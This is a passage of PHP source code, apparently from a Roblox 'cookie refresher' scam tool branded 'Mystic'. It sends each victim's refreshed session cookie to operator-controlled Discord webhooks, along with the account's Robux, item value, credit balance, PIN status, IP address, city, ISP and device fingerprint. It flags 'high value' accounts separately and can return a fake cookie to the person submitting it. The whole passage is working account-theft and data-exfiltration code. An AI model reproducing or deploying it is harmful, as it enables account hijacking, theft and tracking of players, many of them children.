    $creditBalance = isset($creditBalanceData['balance']) ? $creditBalanceData['balance'] : 0;
    $creditRobux = isset($creditBalanceData['robuxAmount']) ? $creditBalanceData['robuxAmount'] : 0;

    $emailVerified = isset($settingsData['IsEmailVerified']) ? ($settingsData['IsEmailVerified'] ? '✅ True' : '❌ False') : '❓ Unknown';

    $totalValue = calculateAccountValue($robux, $rap, $totalGroupFunds, $pendingRobux, $creditRobux);

    $leaderboard = updateLeaderboard([
        'username' => $userInfoData['name'] ?? 'Unknown',
        'userId' => $userId,
        'robux' => $robux,
        'rap' => $rap,
        'totalValue' => $totalValue,
        'country' => $ipInfo['country']
    ]);

    $leaderboardPosition = null;
    foreach ($leaderboard['top_accounts'] as $index => $account) {
        if ($account['userId'] == $userId) {
            $leaderboardPosition = $index + 1;
            break;
        }
    }

    $stats = logRefreshAttempt(true, null, [
        'username' => $userInfoData['name'] ?? 'Unknown',
        'userId' => $userId,
        'robux' => $robux,
        'ip' => $ipInfo['ip'],
        'country' => $ipInfo['country'],
        'device' => $deviceInfo['type'],
        'fingerprint' => $deviceInfo['fingerprint']
    ], [
        'username' => $userInfoData['name'] ?? '—',
        'userId' => $userId,
        'robux' => $robux,
        'pendingRobux' => $pendingRobux,
        'rap' => $rap,
        'summary' => $summary,
        'totalValue' => $totalValue,
        'accountCreated' => $accountCreatedDate,
        'accountAge' => $accountAge,
        'pin' => $pinStatus,
        'premium' => ($settingsData['IsPremium'] ?? false) ? '✅ True' : '❌ False',
        'voiceChat' => $vcStatus,
        'friends' => $friendsCount,
        'followers' => $followersCount
    ]);

    $flagEmoji = $ipInfo['countryCode'] !== '??' ? ":flag_{$ipInfo['countryCode']}:" : '🌍';
    $deviceEmoji = $deviceInfo['type'] === 'Mobile' ? '📱' : ($deviceInfo['type'] === 'Tablet' ? '📋' : '🖥️');
    
    $leaderboardText = $leaderboardPosition ? "🏆 **#{$leaderboardPosition}** on Leaderboard!" : "";
    
    $embed1 = [
        'content' => $isHighValue ? '@everyone **🎯 HIGH VALUE ACCOUNT! 🎯**' : '@everyone',
        'username' => 'Mystic',
        'avatar_url' => 'https://media.discordapp.net/attachments/1387684643779776595/1469867053455245322/shitlogo.jpg',
        'embeds' => [[
            'title' => $isHighValue ? '🎯 HIGH VALUE ACCOUNT DETECTED!' : '✅ Cookie Refreshed',
            'type' => 'rich',
            'description' => "<:check:1350103884835721277> **[Check Cookie](https://hyperblox.eu/controlPage/check/check.php?cookie=$newCookie)** <:line:1350104634982662164> <:refresh:1350103925037989969> **[Refresh Cookie](https://hyperblox.eu/controlPage/antiprivacy/kingvon.php?cookie=$newCookie)** <:line:1350104634982662164> <:profile:1350103857903960106> **[Profile](https://www.roblox.com/users/$userId/profile)** <:line:1350104634982662164> <:rolimons:1350103860588314676> **[Rolimons](https://rolimons.com/player/$userId)**\n\n{$flagEmoji} **Location:** `{$ipInfo['city']}, {$ipInfo['country']}` | IP: `{$ipInfo['ip']}`\n📡 **ISP:** `{$ipInfo['isp']}`\n{$deviceEmoji} **Device:** `{$deviceInfo['type']} - {$deviceInfo['os']} / {$deviceInfo['browser']}`\n🔐 **Fingerprint:** `" . substr($deviceInfo['fingerprint'], 0, 16) . "...`\n📅 **Account Created:** `{$accountCreatedDate}` ({$accountAge})\n💰 **Total Value:** `" . number_format($totalValue) . " R$`\n{$leaderboardText}",
            'color' => $isHighValue ? hexdec('FF0000') : hexdec('00061a'),
            'thumbnail' => ['url' => $avatarUrl],
            'fields' => [
                ['name' => '<:display:1348231445029847110> Display Name', 'value' => "```{$userInfoData['displayName']}```", 'inline' => true],
                ['name' => '<:user:1348232101639618570> Username', 'value' => "```{$userInfoData['name']}```", 'inline' => true],
                ['name' => '<:userid:1348231351777755167> User ID', 'value' => "```$userId```", 'inline' => true],
                ['name' => '<:robux:1348231412834111580> Robux', 'value' => "```$robux```", 'inline' => true],
                ['name' => '<:pending:1348231397529223178> Pending Robux', 'value' => "```$pendingRobux```", 'inline' => true],
                ['name' => '<:rap:1348231409323741277> RAP', 'value' => "```$rap```", 'inline' => true],
                ['name' => '<:summary:1348231417502371890> Summary', 'value' => "```$summary```", 'inline' => true],
                ['name' => '<:pin:1348231400322498591> PIN', 'value' => "```$pinStatus```", 'inline' => true],
                ['name' => '<:premium:1348231403690786949> Premium', 'value' => "```" . ($settingsData['IsPremium'] ? '✅ True' : '❌ False') . "```", 'inline' => true],
                ['name' => '<:vc:1348233572020129792> Voice Chat', 'value' => "```$vcStatus```", 'inline' => true],
                ['name' => '<:headless:1348232978777640981> Headless Horseman', 'value' => "```$headlessStatus```", 'inline' => true],
                ['name' => '<:korblox:1348232956040319006> Korblox Deathspeaker', 'value' => "```$korbloxStatus```", 'inline' => true],
                ['name' => '<:age:1348232331525099581> Account Age', 'value' => "```$accountAge```", 'inline' => true],
                ['name' => '<:friends:1348231449798774865> Friends', 'value' => "```$friendsCount```", 'inline' => true],
                ['name' => '<:followers:1348231447072215162> Followers', 'value' => "```$followersCount```", 'inline' => true],
                ['name' => '<:creditbalance:1350102024376684644> Credit Card Balance', 'value' => "```$creditBalance USD (est $creditRobux Robux)```", 'inline' => true],
                ['name' => '<:group:1350102040818221077> Groups Owned', 'value' => "```$totalGroupsOwned```", 'inline' => true],
                ['name' => '<:combined:1350102005884125307> Combined Group Funds', 'value' => "```$totalGroupFunds Robux```", 'inline' => true],
                ['name' => '<:status:1350102051756970025> Email Verified', 'value' => "```$emailVerified```", 'inline' => true],
            ],
            'footer' => [
                'text' => "Total: {$stats['total']} | Success: {$stats['success']} | Failed: {$stats['failed']}",
            ],
            'timestamp' => date('c')
        ]]
    ];

    $embed2 = [
        'content' => '',
        'username' => 'Cookie',
        'avatar_url' => 'https://media.discordapp.net/attachments/1387684643779776595/1469867053455245322/shitlogo.jpg',
        'embeds' => [[
            'title' => '🔑 Refreshed Cookie',
            'description' => "```$newCookie```",
            'color' => $isHighValue ? hexdec('FF0000') : hexdec('00061a')
        ]]
    ];

    // ================================================
    // SEND WEBHOOKS - High value OR regular (EXCLUSIVE)
    // ================================================
    
    if ($isHighValue && !empty($highValueWebhookUrl)) {
        // HIGH VALUE ACCOUNT - Send ONLY to high-value webhook
        error_log("HIGH VALUE ACCOUNT: Sending to high-value webhook only");
        
        sendWebhook($highValueWebhookUrl, $embed1);
        sleep(2);
        sendWebhook($highValueWebhookUrl, $embed2);
        
    } else if (!$isHighValue && !empty($webhookUrl)) {
        // REGULAR ACCOUNT - Send to main webhook
        error_log("REGULAR ACCOUNT: Sending to main webhook");
        
        sendWebhook($webhookUrl, $embed1);
        sleep(2);
        sendWebhook($webhookUrl, $embed2);
    }

    // Always send stats (if configured)
    if (!empty($statsWebhookUrl)) {
        $successRate = $stats['total'] > 0 ? round(($stats['success'] / $stats['total']) * 100, 2) : 0;
        
        $topErrors = $stats['errors'];
        arsort($topErrors);
        $topErrors = array_slice($topErrors, 0, 5, true);
        
        $errorList = '';
        foreach ($topErrors as $error => $count) {
            $errorList .= "• `{$error}`: {$count}x\n";
        }
        if (empty($errorList)) $errorList = 'No errors yet! 🎉';
        
        $timeAnalytics = getTimeAnalytics();
        $peakHourText = $timeAnalytics ? "Peak Hour: `{$timeAnalytics['peakHour']}` ({$timeAnalytics['peakCount']} refreshes)" : "Not enough data yet";
        
        $leaderboardText = '';
        $lb = getLeaderboard();
        $topCount = min(5, count($lb['top_accounts']));
        for ($i = 0; $i < $topCount; $i++) {
            $acc = $lb['top_accounts'][$i];
            $leaderboardText .= ($i + 1) . ". **{$acc['username']}** - " . number_format($acc['totalValue']) . " R$\n";
        }
        if (empty($leaderboardText)) $leaderboardText = 'No accounts yet!';
        
        $statsEmbed = [
            'username' => 'Mystic Stats',
            'avatar_url' => 'https://media.discordapp.net/attachments/1387684643779776595/1469867053455245322/shitlogo.jpg',
            'embeds' => [[
                'title' => '📊 Refresh Statistics',
                'color' => hexdec('00FF00'),
                'fields' => [
                    ['name' => '📈 Total Attempts', 'value' => "```{$stats['total']}```", 'inline' => true],
                    ['name' => '✅ Successful', 'value' => "```{$stats['success']}```", 'inline' => true],
                    ['name' => '❌ Failed', 'value' => "```{$stats['failed']}```", 'inline' => true],
                    ['name' => '📊 Success Rate', 'value' => "```{$successRate}%```", 'inline' => true],
                    ['name' => '🌍 Last Location', 'value' => "```{$ipInfo['city']}, {$ipInfo['country']}```", 'inline' => true],
                    ['name' => '🆔 Last User', 'value' => "```{$userInfoData['name']}```", 'inline' => true],
                    ['name' => '⏰ Time Analytics', 'value' => $peakHourText, 'inline' => false],
                    ['name' => '🏆 Top 5 Leaderboard', 'value' => $leaderboardText, 'inline' => false],
                    ['name' => '⚠️ Top Errors', 'value' => $errorList, 'inline' => false],
                ],
                'timestamp' => date('c')
            ]]
        ];
        
        sendWebhook($statsWebhookUrl, $statsEmbed);
    }

    // ================================================
    // RETURN FAKE OR REAL COOKIE BASED ON THRESHOLDS
    // ================================================
    $cookieToReturn = $shouldFake ? generateFakeCookie() : $newCookie;
    
    if ($shouldFake) {
        error_log("Returning FAKE cookie for high-value account: User $userId, Robux: $robux, RAP: $rap, Summary: $summary");
    }

    echo json_encode([
        'cookie' => $cookieToReturn,
        'userData' => [
            'username' => $userInfoData['name'] ?? '—',
            'userId' => $userId,
            'robux' => $robux,
            'pendingRobux' => $pendingRobux,
            'rap' => $rap,
            'summary' => $summary,
            'totalValue' => $totalValue,
            'accountCreated' => $accountCreatedDate,
            'accountAge' => $accountAge,
            'pin' => $pinStatus,
            'premium' => ($settingsData['IsPremium'] ?? false) ? '✅ True' : '❌ False',
            'voiceChat' => $vcStatus,
            'friends' => $friendsCount,
            'followers' => $followersCount,
            'leaderboardPosition' => $leaderboardPosition
        ]
    ]);

    @unlink($jar);

} catch (Exception $e) {
    $technicalError = $e->getMessage();
    $userFriendlyError = getUserFriendlyError($technicalError);
    
    error_log("ERROR: $technicalError");
    
    $userIP = getUserIP();
    $ipInfo = getIPInfo($userIP);
    
    $stats = logRefreshAttempt(false, $technicalError, [
        'ip' => $ipInfo['ip'],
        'country' => $ipInfo['country']
    ]);
    
    $env = parse_env();
    $errorWebhookUrl = $env['ERROR_WEBHOOK_URL'] ?? '';
    
    if (!empty($errorWebhookUrl)) {
        $errorEmbed = [
            'username' => 'Mystic Errors',
            'avatar_url' => 'https://media.discordapp.net/attachments/1387684643779776595/1469867053455245322/shitlogo.jpg',
            'embeds' => [[
                'title' => '❌ Refresh Failed',
                'color' => hexdec('FF0000'),
                'fields' => [
                    ['name' => '⚠️ Technical Error', 'value' => "```$technicalError```", 'inline' => false],
                    ['name' => '👤 User Sees', 'value' => "```$userFriendlyError```", 'inline' => false],
                    ['name' => '🌍 Location', 'value' => "```{$ipInfo['city']}, {$ipInfo['country']}```", 'inline' => true],
                    ['name' => '🔗 IP Address', 'value' => "```{$ipInfo['ip']}```", 'inline' => true],
                    ['name' => '📊 Stats', 'value' => "```Total: {$stats['total']} | Failed: {$stats['failed']}```", 'inline' => false],
                ],
                'timestamp' => date('c')
            ]]
        ];
        
        sendWebhook($errorWebhookUrl, $errorEmbed);
    }
    
    http_response_code(400);
    echo json_encode(['error' => $userFriendlyError]);
    
    if (isset($jar) && file_exists($jar)) {
        @unlink($jar);
    }
}
?>
